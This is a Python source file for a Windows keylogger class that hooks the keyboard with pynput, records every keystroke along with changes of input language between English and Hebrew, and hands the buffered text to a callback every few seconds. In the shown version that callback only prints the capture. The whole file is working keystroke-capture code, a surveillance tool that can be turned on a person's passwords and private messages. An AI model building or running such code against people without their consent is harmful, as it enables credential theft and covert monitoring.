import threading
import time
import logging
from datetime import datetime
from pynput import keyboard
import win32gui, win32process, win32api

LANGUAGE_MAP = {
    1033: "English",
    1037: "Hebrew"
}


class KeyloggerService:
    def __init__(self, flush_interval=60):
        self._buffer = []
        self._lock = threading.Lock()
        self._is_logging = False
        self._listener = None
        self._current_language = self._get_current_language()
        self._manager_callback = None
        self._flush_interval = flush_interval
        self._flush_thread = None
        logging.basicConfig(level=logging.ERROR, format='%(asctime)s [%(levelname)s] %(message)s')

    def start_logging(self, callback):
        self._is_logging = True
        self._manager_callback = callback
        self._listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self._listener.start()
        self._flush_thread = threading.Thread(target=self._flush_loop, daemon=True)
        self._flush_thread.start()

    def stop_logging(self):
        self._is_logging = False
        if self._listener:
            self._listener.stop()
            self._listener.join()
        if self._flush_thread and self._flush_thread.is_alive():
            self._flush_thread.join()

    def on_press(self, key):
        new_lang = self._get_current_language()
        if new_lang != self._current_language:
            with self._lock:
                self._buffer.append(f"[LANGUAGE_CHANGED: {new_lang}]")
            self._current_language = new_lang

        with self._lock:
            try:
                self._buffer.append(key.char)
            except AttributeError:
                if key == keyboard.Key.space:
                    self._buffer.append(" ")
                elif key == keyboard.Key.enter:
                    self._buffer.append("\n")
                elif key == keyboard.Key.tab:
                    self._buffer.append("\t")
                elif key == keyboard.Key.backspace and self._buffer:
                    self._buffer.pop()
                else:
                    self._buffer.append(f"[{key}]")

    def on_release(self, key):
        pass

    def get_logged_text(self):
        with self._lock:
            data = "".join(self._buffer)
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            self._buffer.clear()
            return f"[{timestamp}] {data}"

    def _flush_loop(self):
        while self._is_logging:
            time.sleep(self._flush_interval)
            if self._manager_callback:
                flushed_data = self.get_logged_text()
                self._manager_callback(flushed_data)

    def _get_current_language(self):
        try:
            hwnd = win32gui.GetForegroundWindow()
            if hwnd == 0:
                return "Unknown"
            thread_id, _ = win32process.GetWindowThreadProcessId(hwnd)
            layout = win32api.GetKeyboardLayout(thread_id)
            return LANGUAGE_MAP.get(layout & 0xFFFF, f"Unknown({layout & 0xFFFF})")
        except Exception as e:
            logging.error("Error detecting language", exc_info=True)
            return "Unknown"


if __name__ == "__main__":
    def print_logged_data(data):
        print("Flushed Data:", data)


    keylogger = KeyloggerService(flush_interval=10)
    keylogger.start_logging(print_logged_data)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        keylogger.stop_logging()
        print("Keylogger stopped.")